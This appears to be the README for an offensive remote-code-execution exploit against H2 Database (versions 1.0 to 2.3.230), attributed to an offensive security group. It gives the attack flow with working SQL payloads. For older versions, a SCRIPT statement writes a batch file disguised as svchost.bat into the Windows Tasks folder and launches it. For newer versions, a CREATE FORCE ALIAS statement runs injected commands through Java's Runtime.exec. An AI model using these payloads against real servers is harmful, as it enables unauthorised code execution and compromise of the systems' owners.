# H2 Database - RCE  
H2 Database (1.0 ~ 2.3.230) - Remote Code Execution

H2 Database RCE - ViperX Offensive Security
  Date: 17/07/2024

The exploit flow operates with the following logic: 
~ for versions <(1.4) we create a 'dummy' table, and write the output log into a C:\Windows\Tasks\svchost.bat file by using ```
SCRIPT SIMPLE NODATA NOSETTINGS TO '{BAT_FULLPATH}'```

  
  '-> With this bat file we can perform remote code execution with Arbitrary File Writing vulnerability.
  
  '-> for old versions we open the .bat file with "org.h2.util.StartBrowser.openURL" and for the newest one "org.h2.tools.Server.openBrowser"

~ In case of versions >(1.4), we just perform JAVA Code Execution through 'CREATE ALIAS' function:
```

  '->  CREATE FORCE ALIAS CMD_INJECT AS $$
  void pwshInject() throws Exception {
      Runtime.getRuntime().exec("%s");
  }
  $$;
```
